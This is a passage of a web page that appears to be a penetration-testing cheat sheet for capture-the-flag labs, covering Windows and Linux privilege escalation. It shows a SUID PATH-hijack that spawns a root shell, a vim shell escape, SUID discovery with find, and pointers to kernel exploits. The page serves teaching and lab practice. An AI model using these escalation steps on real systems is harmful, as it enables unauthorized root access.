style="color:#393A34"><span class="token plain">MB_LDAP_PASSWORD=</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">MB_DB_CONNECTION_URI=</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">JAVA_VERSION=jdk-11.0.19+7</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">_=/usr/bin/env</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">OLDPWD=/</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="privilege-escalation">Privilege escalation<a href="#privilege-escalation" class="hash-link" aria-label="Direct link to Privilege escalation" title="Direct link to Privilege escalation">​</a></h2>
<p>This step is gaining access to the root or Administrator user of the machine. Once we do that, we can do whatever we want with that machine. The topic is very broad and this section only provides a summary of things to watch out.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="windows">Windows<a href="#windows" class="hash-link" aria-label="Direct link to Windows" title="Direct link to Windows">​</a></h3>
<p>You can use <a href="https://github.com/carlospolop/PEASS-ng" target="_blank" rel="noopener noreferrer">https://github.com/carlospolop/PEASS-ng</a>. You need to run the executable file in the target Windows machine. The script will identify the possible vulnerabilities to exploit and gain admin access.</p>
<p>It might be possible that the password of the admin user has been pasted in the history of the shell. Check the output of winpeas for references to <code>ConsoleHost_history.txt</code> file.</p>
<p>Another interesting path to privilege escalation is to check the permissions of a file. In order to do so, run <code>icacls</code> command. (F) means <code>Full access</code> and is a promising way of privilege escalation.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="linux">Linux<a href="#linux" class="hash-link" aria-label="Direct link to Linux" title="Direct link to Linux">​</a></h3>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="hidden-files">Hidden files<a href="#hidden-files" class="hash-link" aria-label="Direct link to Hidden files" title="Direct link to Hidden files">​</a></h4>
<p>Once you got foothold to a server and if you need to perform lateral movement or privilege escalation, most of the times, there will be some hidden configuration file worth exploring. Remember to set the flags to <code>ls</code> to check the hidden files:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ls -lisa</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="check-accessible-folders">Check accessible folders<a href="#check-accessible-folders" class="hash-link" aria-label="Direct link to Check accessible folders" title="Direct link to Check accessible folders">​</a></h4>
<p>Check what&#x27;s in the following directories:</p>
<ul>
<li>/home/user</li>
<li>/var/xxxx</li>
<li>/etc/xxx</li>
</ul>
<p>e.g. in <code>Artificial</code> machine, there was an accessible file in <code>/var/logs</code> which was the key to resolve the machine.</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="sudo">Sudo<a href="#sudo" class="hash-link" aria-label="Direct link to Sudo" title="Direct link to Sudo">​</a></h4>
<p>You can check if the user can run <code>sudo</code> command and with which privileges or restrictions by running:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">jack@clicker:~$ sudo -l</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Matching Defaults entries for jack on clicker:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    env_reset, mail_badpass,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    use_pty</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">User jack may run the following commands on clicker:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    (ALL : ALL) ALL</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    (root) SETENV: NOPASSWD: /opt/monitor.sh</span><br></span></code></pre></div></div>
<ul>
<li>NOPASSWD: means the user can execute the program without password as root.</li>
<li>SETENV: means the user can set environment variables running the program as root.</li>
</ul>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="suid">SUID<a href="#suid" class="hash-link" aria-label="Direct link to SUID" title="Direct link to SUID">​</a></h4>
<p>If you see some entry that allows the user to execute a binary as superuser you can check the file flags and permissions by running:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ls -lisa /usr/bin/bugtracker</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">264151 12 -rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker</span><br></span></code></pre></div></div>
<p>The &#x27;s&#x27; in the result is the sticky bit in the file permissions.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">file /usr/bin/bugtracker</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/bugtracker: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=b87543421344c400a95cbbe34bbc885698b52b8d, not stripped</span><br></span></code></pre></div></div>
<p>The <code>setuid</code> permission is the sticky bit representation in the file command output.</p>
<p>That is a special permission named SUID or Set Owner User ID. SUID allows an alternate user to run an executable with the same permissions as the owner of the file instead of the permissions of the alternate user. That looks promising for privilede escalation.</p>
<p>In our case, the binary &#x27;bugtracker&#x27; is owned by root &amp; we can execute it as root since it has SUID set.</p>
<p>If we execute the app, we can see that is asking for input. On invalid input it shows an error showing that it&#x27;s using <code>cat</code> command:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">robert@oopsie:/var/www/html$ bugtracker 12</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">bugtracker 12</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">------------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">: EV Bug Tracker :</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">------------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Provide Bug ID: 12</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">12</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">---------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cat: /root/reports/12: No such file or directory</span><br></span></code></pre></div></div>
<p>Looks like it&#x27;s not using the full path of the cat tool. We can create a executable named <code>cat</code> and put it before in PATH and it will execute that <code>cat</code> (/tmp/cat) instead of the real <code>cat</code>:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo &quot;/bin/sh&quot; &gt; /tmp/cat</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">robert@oopsie:/var/www/html$ export PATH=/tmp:$PATH</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">robert@oopsie:/var/www/html$ echo $PATH</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">robert@oopsie:/var/www/html$ bugtracker	</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">bugtracker</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">------------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">: EV Bug Tracker :</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">------------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Provide Bug ID: 12</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">12</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">---------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">whoami</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">root</span><br></span></code></pre></div></div>
<p>and we have root access.</p>
<p>You can try to find all the files that has the suid flag set:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">find / -perm -u=s -type f 2&gt;/dev/null</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="gtfobins">GTFObins<a href="#gtfobins" class="hash-link" aria-label="Direct link to GTFObins" title="Direct link to GTFObins">​</a></h4>
<p>If <code>sudo -l</code> shows permission for any binary, check <a href="https://gtfobins.github.io" target="_blank" rel="noopener noreferrer">https://gtfobins.github.io</a> for a way to exploit the binary to gain root access.</p>
<p>E.g.: you can get root access with vim. If the user has sudo access to edit some file, you can abuse it to get root access:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">vi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">:set shell=/bin/sh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">:shell</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="check-write-access-to-path">Check write access to PATH<a href="#check-write-access-to-path" class="hash-link" aria-label="Direct link to Check write access to PATH" title="Direct link to Check write access to PATH">​</a></h4>
<p>Check if you can write to some path in the PATH variable</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> os</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">paths </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> os</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">environ</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">&quot;PATH&quot;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">split</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;:&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> path </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> paths</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    writetable</span><span class="token operator" style="color:#393A34">=</span><span class="token boolean" style="color:#36acaa">True</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    filename</span><span class="token operator" style="color:#393A34">=</span><span class="token string-interpolation string" style="color:#e3116c">f&quot;</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">path</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">/a&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">try</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">with</span><span class="token plain"> </span><span class="token builtin">open</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">filename</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;w&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> file1</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            file1</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">write</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;Hello&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">except</span><span class="token plain"> Exception</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        writetable</span><span class="token operator" style="color:#393A34">=</span><span class="token boolean" style="color:#36acaa">False</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> writetable</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        os</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">system</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string-interpolation string" style="color:#e3116c">f&quot;rm </span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">filename</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">path </span><span class="token operator" style="color:#393A34">+</span><span class="token string" style="color:#e3116c">&quot; ... &quot;</span><span class="token operator" style="color:#393A34">+</span><span class="token builtin">str</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">writetable</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="check-open-ports">Check open ports<a href="#check-open-ports" class="hash-link" aria-label="Direct link to Check open ports" title="Direct link to Check open ports">​</a></h4>
<p>Might be interesting to what ports are listening in the server, you might find something vulnerable listening only in localhost for example.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">netstat -tunap |grep &quot;LISTEN&quot;</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="kernel-version">Kernel version<a href="#kernel-version" class="hash-link" aria-label="Direct link to Kernel version" title="Direct link to Kernel version">​</a></h4>
<p>Search OS version and kernel for CVEs:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">uname -a</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux</span><br></span></code></pre></div></div>
<p>If we look in Google for <code>6.2.0-25-generic #25~22.04.2-Ubuntu CVE</code> you&#x27;ll see this link: <a href="https://www.wiz.io/blog/ubuntu-overlayfs-vulnerability" target="_blank" rel="noopener noreferrer">https://www.wiz.io/blog/ubuntu-overlayfs-vulnerability</a> and this link <a href="https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629" target="_blank" rel="noopener noreferrer">https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629</a></p></div></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#enumeration" class="table-of-contents__link toc-highlight">Enumeration</a><ul><li><a href="#web-enumeration" class="table-of-contents__link toc-highlight">Web enumeration</a><ul><li><a href="#directory-brute-foce" class="table-of-contents__link toc-highlight">Directory brute-foce</a></li><li><a href="#sub-domain-brute-force" class="table-of-contents__link toc-highlight">Sub-domain brute force</a></li><li><a href="#robotstxt" class="table-of-contents__link toc-highlight">Robots.txt</a></li><li><a href="#whatweb" class="table-of-contents__link toc-highlight">Whatweb</a></li></ul></li><li><a href="#smb-enumeration" class="table-of-contents__link toc-highlight">SMB enumeration</a></li></ul></li><li><a href="#breaking-in" class="table-of-contents__link toc-highlight">Breaking in</a><ul><li><a href="#anonymous-access" class="table-of-contents__link toc-highlight">Anonymous access</a></li><li><a href="#guessbrute-force-credentials" class="table-of-contents__link toc-highlight">Guess/Brute force credentials</a></li><li><a href="#sql-injection" class="table-of-contents__link toc-highlight">SQL Injection</a></li><li><a href="#server-side-template-injection-ssti" class="table-of-contents__link toc-highlight">Server side template injection (SSTI)</a></li><li><a href="#arbitrary-file-upload" class="table-of-contents__link toc-highlight">Arbitrary file upload</a></li><li><a href="#file-inclusion-lfirfi" class="table-of-contents__link toc-highlight">File inclusion (LFI,RFI)</a></li><li><a href="#reverse-shell-" class="table-of-contents__link toc-highlight">Reverse shell <a></a></a></li><li><a href="#rogue-servers-" class="table-of-contents__link toc-highlight">Rogue servers <a></a></a><ul><li><a href="#ntlm-" class="table-of-contents__link toc-highlight">NTLM <a></a></a></li><li><a href="#log4jshell-" class="table-of-contents__link toc-highlight">Log4jShell <a></a></a></li></ul></li><li><a href="#xml-external-entities-xxe" class="table-of-contents__link toc-highlight">XML eXternal Entities (XXE)</a></li><li><a href="#jwt-key-confussion-attack" class="table-of-contents__link toc-highlight">JWT Key confussion attack</a></li><li><a href="#cross-site-scripting-xss-" class="table-of-contents__link toc-highlight">Cross-Site Scripting (XSS) <a></a></a></li><li><a href="#cookie-hijacking" class="table-of-contents__link toc-highlight">Cookie hijacking</a></li></ul></li><li><a href="#foothold-we-are-in" class="table-of-contents__link toc-highlight">Foothold, we are in</a><ul><li><a href="#list-users-and-groups" class="table-of-contents__link toc-highlight">List users and groups</a></li><li><a href="#search-for-interesting-keywords" class="table-of-contents__link toc-highlight">Search for interesting keywords</a></li><li><a href="#local-port-forwarding" class="table-of-contents__link toc-highlight">Local port forwarding</a></li><li><a href="#lateral-movement" class="table-of-contents__link toc-highlight">Lateral movement</a></li></ul></li><li><a href="#privilege-escalation" class="table-of-contents__link toc-highlight">Privilege escalation</a><ul><li><a href="#windows" class="table-of-contents__link toc-highlight">Windows</a></li><li><a href="#linux" class="table-of-contents__link toc-highlight">Linux</a><ul><li><a href="#hidden-files" class="table-of-contents__link toc-highlight">Hidden files</a></li><li><a href="#check-accessible-folders" class="table-of-contents__link toc-highlight">Check accessible folders</a></li><li><a href="#sudo" class="table-of-contents__link toc-highlight">Sudo</a></li><li><a href="#suid" class="table-of-contents__link toc-highlight">SUID</a></li><li><a href="#gtfobins" class="table-of-contents__link toc-highlight">GTFObins</a></li><li><a href="#check-write-access-to-path" class="table-of-contents__link toc-highlight">Check write access to PATH</a></li><li><a href="#check-open-ports" class="table-of-contents__link toc-highlight">Check open ports</a></li><li><a href="#kernel-version" class="table-of-contents__link toc-highlight">Kernel version</a></li></ul></li></ul></li></ul></div></div></div></div></main></div></div></div></div>
</body>
</html>